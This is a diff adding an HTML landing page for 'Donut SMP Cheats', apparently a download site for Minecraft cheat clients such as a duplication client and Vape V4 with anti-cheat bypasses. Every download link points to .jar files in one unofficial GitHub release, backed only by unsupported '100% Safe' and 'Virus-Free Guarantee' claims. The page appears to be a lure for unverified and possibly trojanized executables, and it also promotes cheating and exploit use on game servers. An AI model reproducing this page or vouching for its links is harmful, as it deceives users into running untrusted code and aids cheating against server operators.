@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Donut SMP Cheats - Premium Minecraft Mods</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div id="loader" class="loader-container">
+        <div class="spinner"></div>
+        <h2>Loading Premium Mods...</h2>
+    </div>
+
+    <nav class="navbar">
+        <div class="logo">
+            <a href="#">Donut SMP Cheats</a>
+        </div>
+        <ul class="nav-links">
+            <li><a href="#">Home</a></li>
+            <li><a href="#mods">Mods</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#support">Support</a></li>
+        </ul>
+    </nav>
+
+    <header class="hero">
+        <div class="hero-content">
+            <h1>Premium Minecraft Mods</h1>
+            <p>Download the best Fabric Java mods for Minecraft with just a few clicks. All mods are verified safe and regularly updated.</p>
+            <a href="#mods" class="btn-primary">Browse Mods</a>
+            
+            <div class="stats-container">
+                <div class="stat-box">
+                    <h3>50K+</h3>
+                    <p>Downloads</p>
+                </div>
+                <div class="stat-box">
+                    <h3>100%</h3>
+                    <p>Safe</p>
+                </div>
+                <div class="stat-box">
+                    <h3>24/7</h3>
+                    <p>Support</p>
+                </div>
+            </div>
+
+            <div class="guarantees">
+                <span>✓ Virus-Free Guarantee</span>
+                <span>✓ Regular Updates</span>
+                <span>✓ Safe Downloads</span>
+            </div>
+        </div>
+    </header>
+
+    <section id="mods" class="mods-section">
+        <h2 class="section-title">Available Mods</h2>
+        
+        <div id="mods-grid" class="mods-grid">
+            
+            <div class="mod-card">
+                <h3>Donut SMP Dupe Client</h3>
+                <p>Advanced duplication client with intuitive UI and powerful features for SMP servers.</p>
+                <button class="btn-secondary" onclick="showModDetails('donut')">View Details</button>
+            </div>
+
+            <div class="mod-card">
+                <h3>Krypton Client</h3>
+                <p>Optimization mod that improves network performance and reduces lag on multiplayer servers.</p>
+                <button class="btn-secondary" onclick="showModDetails('krypton')">View Details</button>
+            </div>
+
+            <div class="mod-card">
+                <h3>Prestige Client</h3>
+                <p>Feature-rich utility client with advanced tools for competitive Minecraft gameplay.</p>
+                <button class="btn-secondary" onclick="showModDetails('prestige')">View Details</button>
+            </div>
+
+            <div class="mod-card">
+                <h3>Meteor Client</h3>
+                <p>Popular Fabric utility mod with an extensive set of features and regular updates.</p>
+                <button class="btn-secondary" onclick="showModDetails('meteor')">View Details</button>
+            </div>
+
+            <div class="mod-card">
+                <h3>Baritone Farm Builder</h3>
+                <p>Automated pathfinding and farming system that can build complex farms automatically.</p>
+                <button class="btn-secondary" onclick="showModDetails('baritone')">View Details</button>
+            </div>
+
+            <div class="mod-card">
+                <h3>Vape V4</h3>
+                <p>Advanced ghost client with bypasses for popular anti-cheat systems and premium features.</p>
+                <button class="btn-secondary" onclick="showModDetails('vape')">View Details</button>
+            </div>
+        </div>
+
+        <div id="mod-details-container" class="mod-details-container" style="display: none;">
+            
+            <div id="donut-details" class="mod-detail-content" style="display: none;">
+                <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
+                <h2>Donut SMP Dupe Client</h2>
+                <p>The Donut SMP Dupe Client is a specialized utility mod designed for SMP servers. It features an intuitive user interface and powerful duplication capabilities that work on various server versions. The client is regularly updated to ensure compatibility and includes safety features to prevent detection.</p>
+                <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/DonutSMPDupe.jar" class="btn-primary download-btn">Download Now</a>
+            </div>
+
+            <div id="krypton-details" class="mod-detail-content" style="display: none;">
+                <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
+                <h2>Krypton Client</h2>
+                <p>Krypton is a Minecraft mod designed to optimize the game's network stack and reduce lag on multiplayer servers. It improves packet handling, reduces memory usage, and provides a smoother multiplayer experience without compromising gameplay features.</p>
+                <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/Krypton-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
+            </div>
+
+            <div id="prestige-details" class="mod-detail-content" style="display: none;">
+                <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
+                <h2>Prestige Client</h2>
+                <p>Prestige Client is a feature-rich utility mod that offers advanced tools for competitive Minecraft gameplay. It includes various modules for movement, combat, rendering, and world interaction, all wrapped in a clean and customizable user interface.</p>
+                <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/Prestige-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
+            </div>
+
+            <div id="meteor-details" class="mod-detail-content" style="display: none;">
+                <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
+                <h2>Meteor Client</h2>
+                <p>Meteor Client is one of the most popular Fabric utility mods available. It boasts an extensive set of features including baritone integration, combat modules, movement enhancements, and rendering improvements. The client is open source and receives regular updates from an active development team.</p>
+                <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/Meteor-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
+            </div>
+
+            <div id="baritone-details" class="mod-detail-content" style="display: none;">
+                <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
+                <h2>Baritone Farm Builder</h2>
+                <p>Baritone Farm Builder is an automated pathfinding system that can construct complex farms with minimal user input. It uses advanced algorithms to navigate the Minecraft world and perform building tasks efficiently. Perfect for large-scale farming projects and automation.</p>
+                <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/baritone-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
+            </div>
+
+            <div id="vape-details" class="mod-detail-content" style="display: none;">
+                <button class="btn-back" onclick="showGrid()">← Back to All Mods</button>
+                <h2>Vape V4</h2>
+                <p>Vape V4 is an advanced ghost client designed for competitive Minecraft gameplay. It features sophisticated bypasses for popular anti-cheat systems while providing a wide range of combat, movement, and rendering enhancements. The client includes a customizable interface and regular updates to maintain effectiveness.</p>
+                <a href="https://github.com/skombalwouter-cyber/proxy-clients-/releases/download/client/vapeV4-1.21.1.jar" class="btn-primary download-btn">Download Now</a>
+            </div>
+
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h3>Donut SMP Cheats</h3>
+                <p>Your trusted source for premium Minecraft mods and clients. All downloads are verified safe and regularly updated.</p>
+            </div>
+            <div class="footer-col">
+                <h3>Quick Links</h3>
+                <a href="#">Home</a>
+                <a href="#mods">Mods</a>
+                <a href="#about">About</a>
+                <a href="#support">Support</a>
+            </div>
+            <div class="footer-col">
+                <h3>Legal</h3>
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">DMCA</a>
+            </div>
+            <div class="footer-col">
+                <h3>Support</h3>
+                <a href="#">Contact Us</a>
+                <a href="#">FAQ</a>
+                <a href="#">Discord</a>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2023 Donut SMP Cheats. All rights reserved. Minecraft is a trademark of Mojang AB.</p>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
